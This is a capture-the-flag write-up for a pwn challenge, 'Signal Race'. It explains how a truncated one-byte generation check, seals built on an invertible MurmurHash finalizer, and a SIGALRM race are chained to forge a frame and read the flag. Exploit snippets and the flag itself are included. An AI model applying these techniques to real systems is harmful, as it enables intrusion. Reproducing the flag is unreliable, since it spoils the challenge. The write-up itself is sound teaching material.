# Signal Race

**Category:** Pwn  ·  **Flag:** `ASIS{8d88aebc6d193672f1e3a2ddced7bc58b2769d1f}`

## Challenge Description

> A paranoid VM, a badly timed signal, and a flag begging to escape.

One stripped PIE executable (`signal-race-vm`, NX, PIE, stack canary, full
RELRO) implementing a small virtual machine with objects, bookmarks, integrity
checks, and a checkpoint system. `strings` reveals the protocol vocabulary:
`NEW NOTE EDIT BOOKMARK READ WRITE DROP TIMER RUN RESTORE QUIT`. The banner:

```text
SR/1 release=588fce9879c77b15ca9d7383 chunk=192
```

`chunk=192`: every VM object has a 192-byte data area.

## Initial Analysis

The program keeps 24 object slots, each `0xc8` (200) bytes:

```c
struct object {
    uint32_t type;        // 0 = free, 1 = frame, 2 = note
    uint32_t generation;
    uint8_t  data[192];
};
```

Commands: `NEW` (protected frame), `NOTE`/`EDIT` (editable note), `BOOKMARK`
(handle for later read/write), `READ`/`WRITE` (through a bookmark), `DROP`,
`RUN <frame> <bytecode>`, `RESTORE` (restore the saved checkpoint).

The generation number is meant to stop a stale bookmark from reaching a reused
slot. The frame header holds three integrity values:

| Offset | Purpose |
|---:|---|
| `0x00` | Magic `0x53523ab0` |
| `0x04` | Selector |
| `0x10` | Per-frame nonce/state |
| `0x18` | First keyed seal |
| `0x20` | 32-bit checksum |
| `0x24` | Path string |
| `0x94` | Second keyed seal |

`RESTORE` only reads the flag if the checkpointed frame has
`selector == 0x5352858a` and path `"/flag"`, with valid magic, both seals, and
checksum.

## Vulnerability / Core Concept

Three flaws combine:

1. **Bookmark generation is only 1 byte.** The check compares only the low 8
   bits: `if ((uint8_t)object->generation != bookmark->generation_byte) reject();`.
   Generations are 32-bit, so after 256 increments the bookmark believes the old
   generation returned: a stale bookmark to a freed note is accepted for a new
   frame in the same slot.
2. **The keyed seals are reversible.** Both use a MurmurHash3 64-bit finalizer
   (`fmix`); XOR-with-shift and odd multipliers are all invertible mod `2^64`,
   so reading one legitimate frame recovers both per-session keys.
3. **A signal race creates the checkpoint.** `TIMER` arms `SIGALRM` (handler just
   sets `signal_seen = 1`). VM opcode `0x92` clears the flag, runs a long loop,
   and records a checkpoint if the signal arrived during the loop.

## Exploitation

Full exploit in `solve.py`. Steps:

1. `NOTE 00`, then `BOOKMARK` it (slot number is randomized; the exploit parses
   it).
2. `DROP`, then 127 `NEW`/`DROP` cycles (+254) and one final `NEW` (+1). One
   `NEW`/`DROP` cycle adds 2, so `G + 1 + 254 + 1 = G + 256`; the low byte is
   unchanged and the stale bookmark now points at a fresh protected frame: 258
   commands, under the 512 quota.
3. `READ 0 0 192` through the stale bookmark to dump the frame.
4. Recover the two seal keys by inverting `fmix` and XORing out the known fields:
   ```python
   def inv_fmix(x):
       x ^= x >> 33
       x = (x * pow(0xC4CEB9FE1A85EC53, -1, 1 << 64)) & MASK
       x ^= x >> 33
       x = (x * pow(0xFF51AFD7ED558CCD, -1, 1 << 64)) & MASK
       x ^= x >> 33
       return x
   ```
5. Trigger the checkpoint via the signal race, sending `TIMER` and `RUN`
   together to avoid losing the alarm to latency:
   ```python
   bytecode = bytes([0x92, object_number, 0x6f]).hex()   # checkpoint, frame, stop
   sock.sendall(f'TIMER 100\nRUN {object_number} {bytecode}\n'.encode())
   # → OK run checkpoint=1
   ```
6. Forge the frame: set selector `0x5352858a` and path `/flag`, then recompute
   the first seal (`0x18`), the second seal (`0x94`, includes the first), and the
   FNV-like checksum (`0x20`, covers both seals):
   ```python
   struct.pack_into('<I', frame, 0x04, 0x5352858a)
   frame[0x24:0x2c] = b'/flag\0\0\0'
   ```
7. `WRITE` the forged 192-byte frame through the stale bookmark, then `RESTORE`.

Final exchange:

```text
OK run checkpoint=1
OK wrote=192
OK ASIS{8d88aebc6d193672f1e3a2ddced7bc58b2769d1f}
```

Run with `python3 solve.py <HOST> <PORT>`.

## Flag

`ASIS{8d88aebc6d193672f1e3a2ddced7bc58b2769d1f}`

## Key Takeaways

- A generation counter is only useful if the *whole* number is checked: truncating to one byte reintroduces the stale-handle bug it was meant to stop.
- A reversible mixing function (MurmurHash finalizer) is not a MAC; if you can
  read the output and know the other inputs, you recover the key.
- Signal handlers can change program state at almost any instruction, so
  signal-driven logic (checkpoint-on-signal) is inherently racy.
- No single bug prints the flag: the stale bookmark grants access, the reversible
  seals enable forgery, and the signal race creates the required checkpoint.
